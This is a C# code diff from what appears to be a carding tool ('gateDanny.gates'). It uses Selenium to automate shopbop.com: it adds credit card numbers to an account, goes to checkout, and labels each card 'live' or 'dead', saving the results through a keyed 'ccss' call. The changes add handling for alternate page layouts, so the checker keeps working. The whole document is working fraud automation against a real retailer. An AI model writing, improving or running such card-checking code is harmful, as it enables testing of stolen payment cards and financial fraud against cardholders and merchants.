@@ -468,7 +468,19 @@ namespace gateDanny.gates
                                                                                             {
                                                                                                 pago2();
                                                                                             }
-                                                                                            else
+                                                                                            else if (IsElementPresent(By.XPath("/html/body/div[14]/div[1]/div[2]/div[1]/div/div[3]/div[1]/div[1]/div/div[1]/div[4]")))
+                                                                                            {
+                                                                                                driver.Navigate().GoToUrl("https://www.shopbop.com/account/creditcards?add");
+                                                                                                Thread.Sleep(500);
+                                                                                                if (tiempoElemento(By.Id("creditCardViewBean.walletCreditCardNumber")))
+                                                                                                {
+                                                                                                    pago();
+                                                                                                }
+                                                                                                else
+                                                                                                {
+                                                                                                    restart();
+                                                                                                }
+                                                                                            }else
                                                                                             {
                                                                                                 restart();
                                                                                             }
@@ -746,19 +758,38 @@ namespace gateDanny.gates
 
                             }
                             Thread.Sleep(100);
-                            driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div/div/form/div[2]/div/div[8]/div/div/div/div[1]/input")).Click();
-                            Thread.Sleep(100);
 
-                            driver.FindElement(By.XPath("//*[@id='page']/div[2]/div/div[11]/button")).Click();
+                            if (IsElementPresent(By.XPath("/html/body/div[12]/div[1]/div/div/form/div[2]/div/div[8]/div/div/div/div[1]/input")))
+                            {
+                                driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div/div/form/div[2]/div/div[8]/div/div/div/div[1]/input")).Click();
+                                Thread.Sleep(100);
+                            }
+                             
+
+
+                            if (IsElementPresent(By.XPath("/html/body/div[14]/div[1]/div/div/form/div[2]/div/div[8]/div/div/div/div[1]/input")))
+                            {
+                                driver.FindElement(By.XPath("/html/body/div[14]/div[1]/div/div/form/div[2]/div/div[8]/div/div/div/div[1]/input")).Click();
+                                Thread.Sleep(100);
+                            }
+
+                           
+                                driver.FindElement(By.XPath("//*[@id='page']/div[2]/div/div[11]/button")).Click();
                             Thread.Sleep(200);
 
                             if (IsElementPresent(By.XPath("//*[@id='existingCreditCardsDiv']/div/div/div[2]/div[1]/a[1]")))
                             {
                                 driver.Navigate().GoToUrl("https://www.shopbop.com/checkout");
-                                Thread.Sleep(200);
-                                if (tiempoElemento(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")))
+                                Thread.Sleep(3000);
+                                
+                                if (IsElementPresent(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")))
                                 {
                                     driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")).Click();
+                                    Thread.Sleep(5000);
+                                }
+                                else if(IsElementPresent(By.XPath("/html/body/div[14]/div[1]/div[2]/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")))
+                                {
+                                    driver.FindElement(By.XPath("/html/body/div[14]/div[1]/div[2]/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")).Click();
                                     Thread.Sleep(5000);
                                 }
                                 else
@@ -887,7 +918,7 @@ namespace gateDanny.gates
                         }
                         else
                         {
-                            var pais = checkbin(cc.Substring(0, 6));
+                            var pais = "";
                             Thunder._Form1.update_progresbar(100);
                             var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                             check.ccss(Variables.key, guardar, "deads");
@@ -961,11 +992,32 @@ namespace gateDanny.gates
                         }
                     }
 
+                    if (IsElementPresent(By.XPath("/html/body/div[14]/div[1]/div[2]/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")))
+                    {
+                        if (driver.FindElement(By.XPath("/html/body/div[14]/div[1]/div[2]/div[1]/div/div[3]/div[1]/div[1]/div/div[2]/div/div[1]/button")).Displayed == true)
+                        {
+
+                            estado = "dead";
+
+                        }
+                    }
+
                     if (IsElementPresent(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div/div[1]/div[2]/div[1]/span[1]")))
                     {
                         if (driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div/div[1]/div[2]/div[1]/span[1]")).Displayed == true)
                         {
                             if (driver.FindElement(By.XPath("/html/body/div[12]/div[1]/div[2]/div[1]/div/div[3]/div/div[1]/div[2]/div[1]/span[1]")).Text.Trim() != "")
+                            {
+                                estado = "live";
+                            }
+                        }
+                    }
+
+                    if (IsElementPresent(By.XPath("/html/body/div[14]/div[1]/div[2]/div[1]/div/div[3]/div/div[1]/div[2]/div[1]/span[1]")))
+                    {
+                        if (driver.FindElement(By.XPath("/html/body/div[14]/div[1]/div[2]/div[1]/div/div[3]/div/div[1]/div[2]/div[1]/span[1]")).Displayed == true)
+                        {
+                            if (driver.FindElement(By.XPath("/html/body/div[14]/div[1]/div[2]/div[1]/div/div[3]/div/div[1]/div[2]/div[1]/span[1]")).Text.Trim() != "")
                             {
                                 estado = "live";
                             }
